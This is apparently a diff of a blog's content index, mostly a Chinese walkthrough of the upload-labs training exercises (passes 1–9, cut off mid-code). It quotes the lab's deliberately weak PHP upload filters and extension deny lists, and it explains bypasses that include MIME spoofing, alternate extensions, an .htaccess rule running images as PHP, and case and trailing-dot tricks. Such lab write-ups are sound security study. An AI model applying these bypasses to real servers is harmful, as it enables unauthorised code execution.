-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100924916_iOS.jpg" alt></td>
-</tr>
-<tr>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220905_103525175_iOS.jpg" alt></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100338097_iOS.jpg" alt></td>
-<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220630_111017267_iOS.jpg" alt></td>
-</tr>
-</tbody></table>
-<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100528363_iOS.jpg" alt="20220916_100528363_iOS" style="zoom: 25%;">
-
-
-
-<h2 id="关于世界"><a href="#关于世界" class="headerlink" title="关于世界"></a>关于世界</h2><p>未知…</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>照片</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>uploads-labs</title>
-    <url>/2020/09/16/uploads/</url>
-    <content><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><span id="more"></span>
-
-
-
-<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
-<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
-<pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre>
-
-<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
-<p>抓包修改MIME即可</p>
-<p>知识点补充：</p>
-<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
-<pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain
-<span class="hljs-built_in">text</span>/html
-image/jpeg
-image/png
-audio/mpeg
-audio/ogg
-audio/*
-video/mp4
-<span class="hljs-built_in">application</span>/*
-<span class="hljs-built_in">application</span>/json
-<span class="hljs-built_in">application</span>/javascript
-<span class="hljs-built_in">application</span>/ecmascript
-<span class="hljs-built_in">application</span>/octet-stream</code></pre>
-
-<p>更详细的解释，</p>
-<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre>
-
-<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
-<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
-<blockquote>
-<ul>
-<li>URL重写、自定义错误页面</li>
-<li>MIME类型配置</li>
-<li>访问权限控制等</li>
-<li>主要体现在伪静态的应用</li>
-<li>图片防盗链</li>
-<li>自定义404错误页面</li>
-<li>阻止/允许特定IP/IP段</li>
-<li>目录浏览与主页</li>
-<li>禁止访问指定文件类型</li>
-<li>文件密码保护</li>
-</ul>
-</blockquote>
-<pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span>
-<span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
-<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre>
-
-<p>这几句代码的意思：</p>
-<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
-<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
-<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
-<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
-    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
-        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);
-        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
-        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
-        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
-        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
-        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
-        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
-        
-        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
-            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
-            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
-                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-            &#125; <span class="hljs-keyword">else</span> &#123;
-                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-            &#125;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
-    &#125;
-&#125;</code></pre>
-
-<p>本题与第十题完全一样，详细解答见第十题</p>
-<p><img src="/2020/09/16/uploads/5.png" alt></p>
-<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
-    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
-        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
-        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
-        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
-        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
-        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
-        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
-
-        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
-            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
-            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
-                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-            &#125; <span class="hljs-keyword">else</span> &#123;
-                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-            &#125;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
-    &#125;
-&#125;</code></pre>
-
-<p>仔细查看源码会发现少了下面的这段代码</p>
-<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span></code></pre>
-
-<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
-<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
-    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
-        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
-        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
-        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
-        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
-        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
-        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
-        
-        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
-            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
-            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;
-                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-            &#125; <span class="hljs-keyword">else</span> &#123;
-                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-            &#125;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
-    &#125;
-&#125;</code></pre>
-
-<p>跟第六关对比发现少了这句话</p>
-<pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre><p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
-<p><img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" alt></p>
-<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
-    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
-        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
-        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
-        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
-        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
-        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
-        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
-        
-        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
-            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
-            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
-                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-            &#125; <span class="hljs-keyword">else</span> &#123;
-                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-            &#125;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
-    &#125;
-&#125;</code></pre>
-
-<p>这段代码少了这句话，可以与第六关相同的做法</p>
-<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
-<p><img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" alt></p>
-<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
-    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
-        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span 